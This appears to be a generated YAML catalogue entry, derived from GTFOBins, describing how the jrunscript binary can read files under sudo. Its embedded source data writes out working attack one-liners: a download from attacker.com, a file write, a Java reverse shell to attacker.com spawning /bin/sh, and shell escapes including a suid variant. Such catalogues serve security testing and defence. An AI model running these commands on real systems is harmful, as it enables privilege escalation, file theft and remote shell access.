@@ -1,0 +1,113 @@
+id: gtfobins/jrunscript/file-read/sudo
+type: binary
+platform: linux
+name: jrunscript
+phases:
+- collection
+- privilege-escalation
+capabilities:
+- file-read
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: "jrunscript -e 'br = new BufferedReader(new java.io.FileReader(\"/path/to/input-file\"));\n\
+    \    while ((line = br.readLine()) != null) { print(line); }'"
+references:
+- https://gtfobins.github.io/gtfobins/jrunscript/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        jrunscript:
+          comment: This tool is installed starting with Java SE 6.
+          functions:
+            download:
+            - code: jrunscript -e 'cp("http://attacker.com/path/to/input-file","/path/to/output-file")'
+              contexts:
+                sudo: null
+                unprivileged: null
+              sender: http-server
+            file-read:
+            - binary: false
+              code: "jrunscript -e 'br = new BufferedReader(new java.io.FileReader(\"/path/to/input-file\"\
+                ));\n    while ((line = br.readLine()) != null) { print(line); }'"
+              contexts:
+                sudo: null
+                unprivileged: null
+            file-write:
+            - code: "jrunscript -e 'var fw=new java.io.FileWriter(\"/path/to/output-file\");\n    fw.write(\"\
+                DATA\");\n    fw.close();'"
+              contexts:
+                sudo: null
+                unprivileged: null
+            reverse-shell:
+            - code: "jrunscript -e 'var host=\"attacker.com\";\n    var port=12345;\n    var p=new java.lang.ProcessBuilder(\"\
+                /bin/sh\", \"-i\").redirectErrorStream(true).start();\n    var s=new java.net.Socket(host,port);\n\
+                \    var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\n    var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){\n\
+                \    while(pi.available()>0)so.write(pi.read());\n    while(pe.available()>0)so.write(pe.read());\n\
+                \    while(si.available()>0)po.write(si.read());\n    so.flush();po.flush();\n    java.lang.Thread.sleep(50);\n\
+                \    try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'"
+              contexts:
+                sudo: null
+                unprivileged: null
+              listener: tcp-server
+            shell:
+            - code: jrunscript -e 'exec("/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty")'
+              contexts:
+                sudo: null
+                suid:
+                  code: jrunscript -e 'exec("/bin/sh -pc $@|sh${IFS}-p _ echo sh -p </dev/tty >/dev/tty
+                    2>/dev/tty")'
+                  comment: This has been found working in macOS but failing on Linux systems.
+                  shell: false
+                unprivileged: null
+    upstream_url: https://gtfobins.github.io/gtfobins/jrunscript/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-read
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: collection
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: sudo
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:5fc8eeccf8ed5e1e29ba964ba31411e4745da23c46450be8459c9e634735408d
